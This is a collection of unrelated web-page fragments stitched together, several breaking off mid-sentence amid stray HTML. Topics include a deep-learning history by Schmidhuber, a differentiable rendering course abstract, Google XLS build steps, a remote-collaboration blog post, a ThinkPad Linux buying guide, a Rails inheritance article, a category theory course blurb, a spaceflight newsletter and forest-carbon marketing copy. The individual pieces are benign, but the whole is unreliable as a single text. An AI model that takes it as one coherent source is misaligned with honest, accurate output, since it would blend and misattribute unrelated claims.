</p><p> Our results set the stage for the recent <a href="http://people.idsia.ch/~juergen/2010s-our-decade-of-deep-learning.html">decade of deep learning</a> <a href="#DEC">[DEC]</a>. In February 2011, our team extended the approach to deep Convolutional NNs (CNNs) <a href="#GPUCNN1">[GPUCNN1]</a>. This 
greatly improved earlier work
 <a href="#GPUCNN">[GPUCNN]</a>.  
The so-called <em>DanNet</em>
<a href="#GPUCNN1">[GPUCNN1]</a> <a href="#R6">[R6]</a> broke several benchmark records.
In May 2011, <em>DanNet</em> was
<a href="http://people.idsia.ch/~juergen/computer-vision-contests-won-by-gpu-cnns.html">the first deep CNN to win a computer vision competition</a> <a href="#GPUCNN5">[GPUCNN5]</a> <a href="#GPUCNN3">[GPUCNN3]</a>. 
In August 2011, it was 
<a href="http://www.idsia.ch/~juergen/superhumanpatternrecognition.html">the first to win a vision contest with superhuman performance</a>
 <a href="#GPUCNN5">[GPUCNN5]</a>.
Our team kept winning vision contests in 2012 <a href="#GPUCNN5">[GPUCNN5]</a>.
Subsequently, many researchers adopted this technique.
By May 2015, we had the first extremely deep 
FNNs with more than 100 layers <a href="#HW1">[HW1]</a> (compare <a href="#HW2">[HW2]</a> <a href="#HW3">[HW3]</a>). 

</p><p> The original successes required a precise understanding of 
the inner workings of GPUs  <a href="#MLP1">[MLP1]</a> <a href="#GPUCNN1">[GPUCNN1]</a>.
Today, convenient software packages shield the user from such details. 
Compute is roughly 100 times cheaper than a decade ago, 
and many commercial NN applications are based on what started in 2010 <a href="#MLP1">[MLP1]</a> <a href="#DL1">[DL1-4]</a> <a href="#DEC">[DEC]</a>.



 

</p><p>In this context it should be mentioned that right before the 2010s, our team had already achieved another breakthrough in supervised 
deep learning with the 
more powerful <em>recurrent</em> NNs (RNNs) whose basic architectures were introduced over
half a century earlier
<a href="#MC43">[MC43]</a> <a href="#K56">[K56]</a>.  
My PhD student Alex Graves won <a href="http://people.idsia.ch/~juergen/handwriting.html">three connected handwriting competitions (French, Farsi, Arabic)</a> at ICDAR 2009, the famous conference on document analysis and recognition. He used a combination of two methods developed in my research 
groups at TU Munich and the Swiss AI Lab IDSIA: Supervised LSTM RNNs (1990s-2005) <a href="#LSTM0">[LSTM0-6]</a>
(which overcome the famous 
<a href="http://people.idsia.ch/~juergen/fundamentaldeeplearningproblem.html">vanishing gradient problem</a>
 analyzed by my PhD student Sepp Hochreiter <a href="#VAN1">[VAN1]</a> in 1991) and <em>Connectionist Temporal Classification</em> <a href="#CTC">[CTC]</a> (2006).
CTC-trained LSTM was the first  RNN 
to win international contests.
Compare <a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%204">Sec. 4</a> of <a href="#MIR">[MIR]</a> and <a href="http://people.idsia.ch/~juergen/critique-turing-award-bengio-hinton-lecun.html#A">Sec.

</p><p> That is,  by 2010, both our supervised FNNs and our supervised RNNs  
were able to outperform 
all other methods on important problems. 
In <a href="http://people.idsia.ch/~juergen/2010s-our-decade-of-deep-learning.html">the 2010s</a>, this supervised  deep learning revolution quickly spread from Europe to North America and Asia,
with <a href="http://people.idsia.ch/~juergen/impact-on-most-valuable-companies.html">enormous impact on industry and daily life</a>  <a href="#DL4">[DL4]</a> <a href="#DEC">[DEC]</a>.
However, it should be mentioned that
the conceptual roots of deep learning 
reach back deep into the previous millennium <a href="#DEEP1">[DEEP1-2]</a> <a href="#DL1">[DL1-2]</a> 
  <a href="#MIR">[MIR]</a> (<a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%2021">Sec. 21</a> &amp; <a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%2019">Sec. 19</a>) <a href="#T20">[T20]</a> (e.g., <a href="http://people.idsia.ch/~juergen/critique-turing-award-bengio-hinton-lecun.html#II">Sec.

<p><span>Abstract</span></p>
<p>
Physics-based rendering algorithms generate photorealistic images by simulating the flow of light through a detailed mathematical representation of a virtual scene. In contrast, <b>physics-based differentiable rendering</b> algorithms focus on computing derivative of images exhibiting complex light transport effects (e.g., soft shadows, interreflection, and caustics) with respect to arbitrary scene parameters such as camera pose, object geometry (e.g., vertex positions) as well as spatially varying material properties expressed as 2D textures and 3D volumes. This new level of generality has made physics-based differentiable rendering a key ingredient for solving many challenging inverse-rendering problems, that is, the search of scene configurations optimizing user-specified objective functions, using gradient-based methods
</p>
<p>
Further, these techniques can be incorporated into probabilistic inference and machine learning pipelines. For instance, differentiable renderers allow "rendering losses" to be computed with complex light transport effects captured. Additionally, they can be used as generative models that synthesize photorealistic images.
</p>
<p>
<u><b>Challenges.</b></u> Compared to its "ordinary" counterpart, physics-based differentiable rendering introduces unique theoretical and practical challenges. For instance, practical problems can involve many (e.g., 10<sup>6</sup>--10<sup>10</sup>) parameters, making simple techniques for differentiation such as finite differences impractical. More advanced tools for automatic differentiation (e.g., <tt>PyTorch</tt> or <tt>Tensorflow</tt>) record a graph of intermediate computation steps that tends to become prohibitively large. Lastly, geometric derivatives involve a unique challenge: boundaries of objects introduce troublesome discontinuities during the computation of shadows and interreflections that lead to incorrect gradients if precautions are not taken. Thankfully, recent advances in physics-based differentiable rendering theory have enabled the differentiation of radiometric measurements with respect to arbitrary scene parameters as well as unbiased Monte Carlo estimators. <b>In this course, we provide an in-depth introduction to general-purpose physics-based differentiable rendering.</b>

<h2 id="what-is-xls">What is XLS?</h2>
<p>The XLS (Accelerated HW Synthesis) project aims to enable the rapid development
of <em>hardware IP</em> that also runs as efficient <em>host software</em> via "software
style" methodology.</p>
<p>XLS implements a High Level Synthesis (HLS) toolchain which produces
synthesizable designs from flexible, high-level descriptions of functionality.
It is fully Open Source: Apache 2 licensed and developed via GitHub.</p>
<p>XLS is used inside of Google for generating feed-forward pipelines from
"building block" routines / libraries that can be easily retargeted, reused, and
composed in a latency-insensitive manner.</p>
<p><em>Not yet available</em>, but active work in progress is the implementation of XLS
<em>concurrent processes</em>, in Communicating Sequential Processes (CSP) style, that
allow pipelines to communicate with each other and induct over time.</p>
<p>XLS is still experimental, undergoing rapid development, and not an officially
supported Google product. Expect bugs and sharp edges. Please help by trying it
out, <a href="https://github.com/google/xls/issues">reporting bugs</a>, and letting us know
what you think!</p>
<h2 id="building-from-source">Building From Source</h2>
<p>Currently, XLS must be built from source using the Bazel build system.</p>
<p><em>Note:</em> Binary distributions of the XLS library are not currently available, but
we hope to enable them via continuous integration, <a href="https://github.com/google/xls/issues/108">see this issue</a>.</p>
<p>The following instructions are for the Ubuntu 20.04 (Focal) Linux distribution.
Note that we start by assuming <a href="https://docs.bazel.build/versions/master/install-ubuntu.html">Bazel has been
installed</a>.</p>
<pre><code># Follow the bazel install instructions:
# https://docs.bazel.build/versions/master/install-ubuntu.html
#
# Afterwards we observe:

$ bazel --version
bazel 3.2.0

$ sudo apt install python3-dev python3-distutils python3-dev libtinfo5

# py_binary currently assume they can refer to /usr/bin/env python
# even though Ubuntu 20.04 has no `python`, only `python3`.
# See https://github.com/bazelbuild/bazel/issues/8685

$ mkdir -p $HOME/opt/bin/
$ ln -s $(which python3) $HOME/opt/bin/python
$ echo 'export PATH=$HOME/opt/bin:$PATH' &gt;&gt; ~/.bashrc
$ source ~/.bashrc

$ bazel test -c opt ...
</code></pre>

<p>A reference build/test environment setup is also provided via <code>Dockerfile</code>:</p>
<pre><code>~$ git clone https://github.com/google/xls.git
~$ cd xls
~/xls$ docker build .  # Performs optimized build and test.
</code></pre>

Which is why a well run system of collaboration is critical to team effectiveness. And while collaboration in a shared workspace can be challenging, collaborating with a remote team can be even more daunting. Especially when the main reason your company decided to go remote is a global pandemic.</p><p>Working from home can often feel like you're on an island, separated from colleagues, and left to deal with complex problems on your own. Or to figure out how to connect with your team while being respectful of their time. For most of us, it feels more comfortable brainstorming and bouncing ideas off one another in person—partially because it's what's familiar. But how do we take this clearly beneficial activity (collaborating) that’s vital to achieving our goals, and make it work effectively in our remote world?</p><p>Understanding what makes collaboration useful and how to adapt your processes to improve the way you collaborate is a start. Also, it’s important to address root issues that can derail remote collaboration and to have fun while doing it. Being intentional about how you bring people together and rejiggering your operational processes is essential to making sure your team functions like a well-oiled machine.</p><p><img src="https://cdn.sanity.io/images/e422uarq/production/1372b1fa5071c46caf22a64a946dae10481353e7-2000x945.png?fm=jpg&amp;w=660&amp;dpr=2&amp;q=40" alt="What is remote collaboration?"></p><h3><strong></strong></h3><h2><strong>What is remote collaboration?</strong></h2><p>At the most basic level, collaboration is the act of working jointly with others. It's people with different perspectives, roles, and subject knowledge coming together to share and shape work. Ideally this effort leads to a result that is better—more effective, more efficient, more impactful—than if someone toiled away on their own.</p><p>From landing humankind on the moon to mending centuries old divides between countries, when collaboration works well, it can yield breakthroughs previously thought impossible.&nbsp; It can even create social networks that change the face of human interaction, connecting over <a href="https://blog.hootsuite.com/social-media-statistics-for-social-media-managers/" rel="noopener" target="_self">50% of the world's population or more than 3.8 billion people</a>.</p><h2><strong>Remote work has changed the way we collaborate</strong></h2><p>In the past, we've almost exclusively done collaboration in-person. Whether it's bringing teams together that are spread across the globe for offsites or hopping into a meeting room in the office and creating elaborate "brainstorming art" on the whiteboard for all to see.</p><p>However, the way we work has shifted in the last few years—accelerated by the adoption of remote work due to COVID-19. But just because your entire team is dispersed, doesn't mean that collaboration is any less meaningful or critical&nbsp; to your team's success.</p><p>So, how do you make sure your team can still collaborate, and do it effectively? To avoid being one of the <a href="https://hbr.org/2015/06/75-of-cross-functional-teams-are-dysfunctional" rel="noopener" target="_self">75% of cross functional teams</a> that are dysfunctional because they lack a systemic approach to working together, we’ve put together 5 actionable tactics you can put into practice stat.<br></p><h3><strong>1) Know how and when to collaborate synchronously</strong></h3><p>Planning an office collaboration session typically involves finding time on people's calendars, booking a room, and making sure there are dry-erase markers for the meeting. For better or for worse, you and your team let the magic of being in one place for a singular purpose take over from there.</p><p>However, for remote collaboration to work well, there's an added element to keep in mind: being intentional when it comes to topics and outcomes. Without many of the same organic interpersonal cues that creative work sessions provide, being clear and upfront about what everyone hopes to get out of the session and how folks can help is essential.</p><p><img src="https://cdn.sanity.io/images/e422uarq/production/bd25745327c1a3485da1464ff7ad43f662089347-2000x945.jpg?fm=jpg&amp;w=660&amp;dpr=2&amp;q=40" alt="Planning for your remote collaborate ahead of time"></p><p>One way to do this is to encourage attendees to prepare a topic, a goal, and what type of input would be most useful ahead of time. This tactic will help keep the group focused and make sure you're maximizing time.</p><p>At the end of the session, do a recap to see if it was successful. Ask these two questions: "Has this session pushed the project forward in a meaningful way?" And "Do owners feel more prepared or have clear directives to tackle the challenges in front of them?"</p><p>It should be noted that not all real-time collaboration sessions need to conclude with clear action items to be meaningful. But this should be stated at the outset and the goal should reflect this as well.</p><p>Before you close Google Hangouts, Zoom, or Microsoft Teams, take a moment to assess how things went in terms of process and if there's something everyone would like to do differently in the next session. Iteration is an important part of the process.</p><p>Speaking of next time, another item to consider is the cadence or frequency of your collaboration sessions. These structured meetings for creative problem solving not only serve the purpose of pushing projects forward using your team's hive mind—in lieu of an office—they are a way to <a href="https://www.cmswire.com/social-business/energize-you-enterprise-with-collaboration/" rel="noopener" target="_self">connect and energize the team</a>.</p><p>Try hosting collaboration sessions twice a week, weekly, or every two weeks to determine what makes the most sense for your remote team. At the beginning, keep it consistent so that everyone gets used to the format and make the appropriate adjustments as you go along.</p><p><a href="https://unsplash.com/@headwayio" rel="noopener" target="_self"><img src="https://cdn.sanity.io/images/e422uarq/production/11eb91a1a0ac7f3a9e3168358fef18c7a66cd8d3-5472x3648.jpg?fm=jpg&amp;w=660&amp;dpr=2&amp;q=40" alt="Man communicating with his hands during collaboration."></a></p><p>Photo by Headway on Unsplash</p><h3><strong>2) Document your processes</strong></h3><p>When it comes to collaborating as a remote team, a shared understanding of process makes all the difference. This doesn't mean adding one new process after another. Instead, update your old processes for the remote context to help your team set expectations and be accountable to one another. It will give everyone a roadmap on how best to interact and communicate, and also take the guesswork out of <a href="https://www.range.co/blog/remote-onboarding-tips">onboarding new team members</a>.</p><p>One way to put a standard in place is to create a handbook—using a shared doc— that includes details about the best ways to communicate different types of messages and request feedback.</p><p>Think of it as a living document that can be updated as you test and learn how to best run your remote collaboration sessions. It should also add more color about how best to engage with someone on the team. Because everyone is working in very different environments, it can be difficult to know what impact having school-aged children doing remote learning or a roommate who hosts online fitness classes in the apartment will have on someone’s availability to collaborate. As things change, you’ll continue to update and evolve this document.</p><h3><strong>3) Make asynchronous collaboration a strength</strong></h3><p>One of the truly unique benefits of working remotely is leaning into collaborating asynchronously. In other words, being able to share and connect on topics and projects at the convenience of each team member and their schedules.</p><p>The staggered nature of asynchronous communication is a particular asset when you’re trying to keep the number of meetings down, while still ensuring everyone is in the loop and contributing. It will make your team more flexible and able to adjust to external influences more readily.</p><p>Start with the basics. There are a ton of tools and apps that make staying in sync when you’re not collaborating in real-time easy, like Google Docs, Asana, and Range. Build a culture of using comments and channels that allow people to share without being in the same place at the same time.<br></p><h3><strong>4) Your remote collaboration tool belt</strong></h3><p>Tools! They make collaborating across spaces and timezones possible. We’ve written about the <a href="https://www.range.co/blog/collaboration-tools-slack">magic of integrations</a> and how tools like Range are designed not to just facilitate remote collaboration, but also strengthen team culture every day with features like team building questions and sharing a mood with an emoji. Here a few other tools to have that will slot right into your new framework. </p><p><img src="https://cdn.sanity.io/images/e422uarq/production/49f172ea53d27bac3468d4c70b7fa2a5e8c6fd10-747x539.png?fm=jpg&amp;w=330&amp;dpr=2&amp;q=40" alt="App integrations in Range"></p><ul><li><a href="https://slack.com/" rel="noopener" target="_self">Slack</a> - business communication platform</li><li><a href="https://www.range.co/">Range</a> - team success platform that keeps teams connected and on track</li><li><a href="https://gsuite.google.com/" rel="noopener" target="_self">G Suite</a> - full suite of office productivity tools</li><li><a href="https://asana.com/" rel="noopener" target="_self">Asana</a>, <a href="https://trello.com/home" rel="noopener" target="_self">Trello</a>, <a href="https://www.atlassian.com/software/jira" rel="noopener" target="_self">Jira</a>, <a href="https://about.gitlab.com/" rel="noopener" target="_self">GitLab</a>, <a href="https://github.com/" rel="noopener" target="_self">GitHub</a> - project management and file tracking tools</li><li><a href="https://mural.co/" rel="noopener" target="_self">Mural</a> -<strong> </strong>whiteboarding app<br></li></ul><h3><strong>5) All work and no play makes for dull collaboration</strong></h3><p>While collaborating remotely is undoubtedly about getting work done, you can still have a little bit of fun while you're at it. In fact, adding fun into the mix can help strengthen ties between your team and encourage engagement.</p><p>Playing a <a href="https://blog.hubspot.com/marketing/ice-breaker-games" rel="noopener" target="_self">quick game</a>, answering an <a href="https://icebreaker.range.co/" rel="noopener" target="_self">icebreaker</a>, or putting on music to kick things off are great ways to include levity and get people in the spirit of creative problem solving. Test different ones, rotate them around, and collectively figure out what works to get your team into the best collaboration mode.</p><h3><strong>Go forth and collaborate!</strong></h3><p>Now that you’re armed with these five tips on how to work better together as a team, it’s time to go reimagine the way your remote team collaborates. But the fun doesn’t stop once you’re safely back in the office—you should continue many of these practices when you’re co-located again. At the heart of this exercise is improving how you collaborate in general. Afterall all, great remote collaboration is just great collaboration.</p><p><img src="https://cdn.sanity.io/images/e422uarq/production/25a15bef9b76411971fd43c5d8a52fcb76f43685-480x270.gif" alt="Christina Tosi saying teamwork on Master Cher"></p><hr><p><a href="https://range.co/signup">Sign up for Range</a></p></div></div></section></div>]]>

      <section id="main_content">
        
<p>Today I am going to give you a quick guide on how to get a great Linux laptop at a perfect price. In my experience, Lenovo ThinkPad laptops are one of the least problematic laptop series with Linux, so I will focus on them. ThinkPads with AMD Ryzen CPUs sell for roughly $200 less than their Intel competitors while offering better performance. In addition, you can get a ThinkPad T or E series laptop without the pre-installed Windows, which will save you another $100. I used to recommend the T series above anything, but these days they offer very little over the E series.</p>

<h2 id="note-for-future-thinkpad-releases">Note for Future ThinkPad Releases</h2>
<p>Even though I use ThinkPad E595 as an example in this article, new ThinkPads with newer AMD Ryzen CPUs will be out nearly every year. For future laptop releases, you can apply the same technique that I will be demonstrating here and get the same sweet deals. As of writing this note (Sep-2020), ThinkPad E15/E14 and T15/T14 are partially available, so you can try your luck with them. This guide might also work with non E/T series laptops. If you want to check the Linux compatibility of future models, I have the link to the compatibility table in the next section.</p>

<p>My <a href="https://quanticdev.com/articles/manjaro-linux-productivity-machine" target="_blank">Cleanest Linux Productivity and Development Environment using Manjaro Linux</a> article which can help you set up your shiny new laptop.</p>

<h2 id="lenovo-thinkpad-e595-e-series">Lenovo ThinkPad E595 (E Series)</h2>
<p>For this guide we will buy a Lenovo ThinkPad E595, so let’s start by checking it out. The ThinkPad E595 has acceptable bezels on its great IPS display and a passable 720p webcam on the top bezel. The 45Wh battery should last you for 6-7 hours of coding. (Note that E15 is the successor to E595, and it will become available in August 2020, so you might try that instead.)</p>

<p><img src="https://quanticdev.com/articles/linux-laptop-at-perfect-price/images/lenovo_thinkpad_e595.png" alt="Lenovo ThinkPad E595"></p>

<p>It is charged through the USB-C port with a USB-C charger, has HDMI, Ethernet socket, and a MicroSD slot. It does not have a dedicated graphics card, which means more power efficiency and fewer problems with Linux. Ryzen’s integrated Vega graphics is quite adequate anyway. Even the video editing software started utilizing the integrated Vega graphics card to accelerate editing and rendering.</p>

<p><img src="https://quanticdev.com/articles/linux-laptop-at-perfect-price/images/lenovo_thinkpad_e595_ports.jpg" alt="Lenovo ThinkPad E595 Ports"></p>

<p>Now let’s jump in and buy one of these guys.</p>


<p>Start by going to the Lenovo website at lenovo.com, or using my affiliate link in the resources section above, in case you want to help quanticdev.com. Once the website loads, scroll all the way down and select your country from the dropdown on the bottom right. After that, click on “Laptops” from the top navigation menu. On the new page, look for E595. If you want an identical 14” laptop, you can go with the E495, but for productivity, I recommend E595 for its bigger screen. Once you click on E595’s thumbnail, you will see that it also has Intel counterpart, but we want the AMD one, so make sure that AMD is selected. Click on <strong>“Show All”</strong> to see all the pre-configured models. From the models list, click on the <strong>cheapest one on the left with the Ryzen 3 CPU</strong>. This step is important because only the cheapest one offers the option to purchase without the pre-installed Windows. Do not worry though, we will beef up its configuration after the selection. So, the cheapest base model currently is <strong>$453</strong> (US Dollars without VAT). Click on <strong>“Customize &amp; Buy”</strong>, and you will be taken to the component configuration page.</p>

<p><strong>Note</strong>: If you want to see me doing all these for you live, check out the YouTube video in the resources section above.</p>

<p>The first thing to do on the configuration page is to select the <strong>Ryzen 5</strong> option. It has double the cores of Ryzen 3 and a better integrated GPU. You can also go with <strong>Ryzen 7</strong> if you have the budget or the need for speed. However, this is a laptop in the end, so you are guaranteed to be thermally throttled at some point, so you will start to get diminishing returns as you go higher on the core count. Below the CPU selection, you will see the Operation System selection box. Windows 10 Home is selected by default, but we do not want it. Select <strong>“No Operating System”</strong>, and you will instantly <strong>save $100</strong>. After that, scroll down and select your memory. You can go with <strong>16 GB or 32 GB</strong> depending on the tools you will use. Remember, Linux is very memory efficient, but apps you will use might not be.</p>

<p>Now scroll down a bit and deselect the 1 TB 5400 RPM spinning disk from the storage options. I recommend avoiding spinning disks, but if you have some large files that you want to store on a slower disk, you can leave it selected. Or you can add a larger capacity disk to that slot later when you need it. Just make sure that the dimensions of the 3rd party disk that you are planning to use are correct for your laptop. Scroll down again, and you will see the second hard-drive option. The default selected one is a 128 GB M.2 SSD. Change that to the <strong>512 GB or 1 TB</strong> one so you will have ample fast storage for all your apps. Finally, you can change your keyboard layout to a different language. And that is it. Rest of the configuration is greyed-out by default. Add your new laptop to your cart, and you will see that it adds up to $507 (without VAT). It is probably the best machine you can get at this price and quality for a Linux compatible machine. Since the price is so low, Lenovo will not let you put in any discount coupons. But if you are a student, you can go to the <strong>Laptops &gt; Student Discount</strong> section from the top menu. If you have a .edu email address, you can get a 20% discount from that price. Isn’t being a student a great thing now (no, it is not!).</p>

<h3 id="tip">Tip</h3>
<p>I have a dedicated article on how to setup a clean <strong>Linux productivity and development environment using Manjaro Linux</strong>. It is a 10-minute guide that takes you from installing Linux for the first time on your new laptop to developing a React app with your shiny new Linux tools. If you want to read it, the link is in the resources section above.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Don’t forget, whenever a next generation of ThinkPads with newer AMD Ryzen processors come out, you can always apply the same technique. If you want to check the Linux compatibility of future models, I have the link to the compatibility table in the resources section above. In addition, I will leave an affiliate link to the Lenovo ThinkPad website in the resources section. If you want to support quanticdev, you can use it in your purchase, and the website will get a small percentage of the sale. Finally, if you know someone who needs a great Linux laptop for an amazing price, share this guide with them.</p>

</span><span>Videos</span><span work="" sans";"=""> <span>and</span> 
</span><span>Texts</span><span work="" sans";"=""><span>. The posts are similar enough that they will share certain attributes (like a title), but also different enough that they will require unique columns (a url column for video). In addition, we want to have a newsfeed feature where we display all posts by most recently created. This means we need to have a way to query across the entire</span> 
</span><span>Posts</span><span work="" sans";"=""> <span>architecture.</span></span></p><p><span work="" sans";"=""><span>This problem is generally solved in one of two ways in Rails:</span> 
</span><span>single table inheritance</span><span work="" sans";"=""> <span>(STI) or</span> 
</span><span>abstract classes</span><span>. Since ActiveRecord models do not have to be backed by a database table, these solutions leverage Plain Old Ruby Objects in order to represent this inheritance hierarchy. Polymorphic associations also often get thrown into the mix but don't quite fit our use case (we’ll briefly touch on this). We’ll discuss the pros and cons of each of these approaches and shed light on a new Rails feature that combines the best of both worlds.</span></p>  
  
 <h4><span>Single Table Inheritance (STI)</span></h4> 
  
<p><span work="" sans";"=""><span>In an STI implementation, attributes are stored in a single parent class table and a</span> 
</span><span>type</span><span work="" sans";"=""> <span>column holds the name of the subclass for the given row. Subclasses inherit from the parent class which allows us to write Text specific methods on the Text class without polluting the Video class.&nbsp; Generating a newsfeed is also very straightforward since all the data is in a single table, i.e. we can do things like</span> 
</span><span>Posts.order(created_at: :desc)</span><span>.<br></span><span><br></span></p></div> <p><a id="1268435434" data-caption="STI example"><img src="https://lirp-cdn.multiscreensite.com/8a8eebaa/dms3rep/multi/opt/Screen+Shot+2020-08-02+at+11.00.04+AM-1920w.png" alt="" id="1798209722" data-dm-image-path="https://irp-cdn.multiscreensite.com/8a8eebaa/dms3rep/multi/Screen+Shot+2020-08-02+at+11.00.04+AM.png" onerror="handleImageLoadError(this)"></a> 
</p> 
 <div data-dmtmpl="true" data-element-type="paragraph" data-version="5" id="1828567217" data-uialign="center"><p><span>STI is simple to implement but can quickly get unwieldy as slight differences in models introduce new fields.&nbsp; This leads to wide tables that are full of null values storing information for a collection of now distinct models that are forced to share the same table.</span></p>  
 <h4><span>Abstract Classes</span></h4> 
  
<p><span>Abstract Classes solve the problem of wide tables by giving each model its own table and connecting them via an Abstract Base Model - the parent class cannot be instantiated and must be subclassed to be utilized. Where the entire hierarchy was represented in a single table in STI, the opposite is true using abstract classes.&nbsp;</span></p><p><span work="" sans";"=""><span>This gives us the ability to separate unique attributes to distinct tables, but now we have the opposite problem - repetitive columns. The</span> 
</span><span>author</span><span work="" sans";"=""> <span>and</span> 
</span><span>title</span><span work="" sans";"=""> <span>columns will have to be included in all subclasses. We have also lost the ability to query across the entire hierarchy (i.e.</span> 
</span><span>Posts.all</span><span work="" sans";"=""><span>), making our newsfeed unnecessarily cumbersome.</span> 
</span></p></div>

</p> 
  
 <p><span>We've established that both methods have their strengths but are not without significant drawbacks. So what's the solution?</span></p>

<b>Summary</b>: In this course we explain how category theory—a branch of mathematics known for its ability to organize the key abstractions that structure much of the mathematical universe—has become useful for writing elegant and maintainable code. In particular, we'll use examples from the Haskell programming language to motivate category-theoretic constructs, and then explain these constructs from a more abstract and inclusive viewpoint. Hands-on programming exercises will be used to demonstrate categorical ideas like "the universal property of products" in working Haskell code. A rough list of topics includes: 
</p><ol>
<li>Sets, types, categories, functors, natural transformations</li>
<li>Universal constructions and associated data types</li>
<li>Adjunctions and cartesian closed categories</li>
<li>Algebras, catamorphisms, anamorphisms</li>
<li>Monads, comonads, Kleisli arrows</li>
<li>Monoids, monoidal categories, lax monoidal functors, applicatives</li>
<li>Profunctors, (co)ends, optics</li>
</ol>
<b>We will assume no background knowledge on behalf of the student</b>, starting from scratch on both the programming and mathematics.

ULA kicked the weekend off with a Delta IV Heavy launch of an NRO spy satellite. The aging heavy lifter, which will be phased out and replaced by <a href="https://www.ulalaunch.com/rockets/vulcan-centaur" target="_blank">Vulcan</a> over the next few years, had a <a href="https://twitter.com/torybruno/status/1299623698090135552" target="_blank">T-3 sec hotfire abort</a> complete with a dramatic fireball (<a href="https://youtu.be/1jkjgo0Cs_8" target="_blank">video</a>). The rocket and payload are undamaged, but launch is delayed a week or more while expendable ground systems are replaced. Next up was SpaceX, launching <a href="https://space.skyrocket.de/doc_sdat/saocom-1.htm" target="_blank">SAOCOM-1B</a> into a polar orbit, the <a href="https://www.nasaspaceflight.com/2020/08/spacex-polar-cape-50-years/" target="_blank">first such southward flight path from Florida since 1969</a> when <a href="http://www.digitaljournal.com/tech-and-science/science/herd-shot-around-the-world-the-last-east-coast-polar-launch/article/567614" target="_blank">booster debris landed on Cuba</a> and <a href="https://www.mapfreglobalrisks.com/risks/images/Seguros_de_satelites_ENU_tcm1366-435032.pdf" target="_blank">killed a cow named Rufina</a> 🐮. Returning to this flight path was only possible due to the Falcon 9’s automated self-destruct systems—rocket exhaust in this flight path can block manually radioed abort messages. This launch was also temporarily halted due to its overflight of ULA’s aborted NROL-44 payload (expensive!) and required last minute approval from the NRO. To cap the weekend off,&nbsp;<a href="https://www.rocketlabusa.com/missions/completed-missions/i-cant-believe-its-not-optical/" target="_blank">Rocket Lab returned to flight with their 14th mission</a> (and announced that they will be conducting a first soft ocean splashdown of the booster for their 17th mission). Their&nbsp;<em>I Can’t Believe It’s Not Optical</em> mission was a dedicated launch for <a href="https://www.capellaspace.com/technology" target="_blank">Capella Space</a>, a startup focused on capturing 0.5 m resolution <a href="https://en.wikipedia.org/wiki/Synthetic-aperture_radar" target="_blank">synthetic aperture radar</a> (SAR) data as a service, the first of an eight satellite constellation. (<em>Ed., amusingly, this satellite was originally supposed to launch as a rideshare with SAOCOM-1B, but when that mission was delayed, Capella switched to Rocket Lab, which was then delayed by a July 4th failure, eventually launching just a few hours after the original mission. You just can’t get ahead. </em>🤷‍♂️)</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#etc">¶</a><strong id="etc">Etc.</strong></p><ul><li>Explore Mars has <a href="https://www.exploremars.org/wp-content/uploads/2020/08/H2MR_2020_Web_v1.pdf" target="_blank">released their annual Humans to Mars report</a> detailing progress towards human exploration of the planet in the 2030s.</li><li>The US Department of Education has&nbsp;<a href="https://www.ctemissioncubesat.com/" target="_blank">announced a CubeSat mission design and prototyping challenge for High School students</a>.

America's hundreds of millions 
      of acres of forests can play an important role in fighting climate change.
      <p>SilviaTerra is pioneering a <span>market-based, data-driven mechanism for 
      democratizing access to forest carbon markets</span>.  By paying 
      landowners to change their forest management, SilviaTerra's Natural Capital Exchange (NCAPX) increases 
      the amount of carbon on the landscape.</p></span></p></div><div id="powered-by-basemap"><p><span>NCAPX is built on top of SilviaTerra Basemap, the <span>first 
      high-resolution forest inventory of the continental United States</span>.  Built with support
      from Microsoft AI for Earth, Basemap is annually
      updated to provide forest data about every acre every year.</span></p></div><div id="chapter-2"><div><p><span>To understand how NCAPX increases the amount of carbon on the landscape, let's look at 
      <span>McKean County in Pennsylvania</span>.  Western Pennsylvania forests 
      provide hardwoods that are world-renowned 
      for their beauty and durability. Highly sought after for furniture and flooring, cherry trees in 
      particular are the economic lifeblood of the region.</span></p></div></div><div id="timber-milling"><div><p><span>Forests and the timber industry have been an important part of the Western Pennsylvania 
      economy for hundreds of years.  As other kinds of manufacturing left these rural counties, sawmills 
      became the primary economic driver of the rural economy. <span>Western 
      Pennsylvania is home to many thousands of small forest owners</span> who earn income by harvesting their timber.</span></p></div></div><div id="chapter-3"><div><p><span>Yet forests provide many values beyond just timber.  Wildlife habitat, recreational 
      opportunities, and carbon storage are just a few. <span>Emerging forest 
      carbon markets offer both a powerful tool for fighting climate change</span> as well as an exciting
      new potential source of income for landowners in Pennsylvania.</span></p></div></div><div id="carb-participants"><div><p><span>However, <span>only 4 of the over 19,000 landowners</span> in McKean County
      have large enough landholdings that they could reasonably expect to participate in conventional forest carbon projects.
      This represents only 5% of the total acreage in the county.<p>      Decades-long contract periods, high setup costs, and expensive ongoing measurement and
      monitoring requirements prevent most landowners from profitably participating in forest carbon markets.</p></span></p></div></div><div id="ncapx-participants"><p><span><span>NCAPX democratizes forest carbon markets</span> by empowering
      every landowner to participate. With one-year contract terms and zero participation fees, NCAPX makes it easy
      for landowners to receive payment for reducing their timber harvests this year.</span></p></div><div id="chapter-4"><div><p><span>NCAPX is made possible by <span>SilviaTerra Basemap, which reports 
      the sizes and species of trees on every acre of forest every year</span>.  For every parcel in the county,
      SilviaTerra's <a href="https://www.silviaterra.com/property-report">Property Reports</a> give landowners 
      insight into the composition of their forests, the value of their timber, the amount of carbon on their land, 
      and the payments they could receive by reducing their timber harvest this year.</span></p></div></div><div id="chapter-5"><p><span>To understand how NCAPX changes the amount of carbon on the landscape, let's start by 
      visualizing the amount of carbon held in these forests today.</span></p></div><div id="chapter-6"><p><span>In a year, with no timber harvests, these forests would remove over a million
      tons of carbon from the atmosphere. This is equivalent to taking more than
      200,000 cars off the road for the year.</span></p></div><div id="chapter-7"><div><p><span>But of course, many timber harvests occur every year in this county, removing carbon 
      from the landscape.  Where is carbon at risk?  Using high-resolution forest data from SilviaTerra 
      Basemap and economic modeling, <span>SilviaTerra is able to 
      calculate how much carbon is likely to be harvested on each property</span>. This represents the 
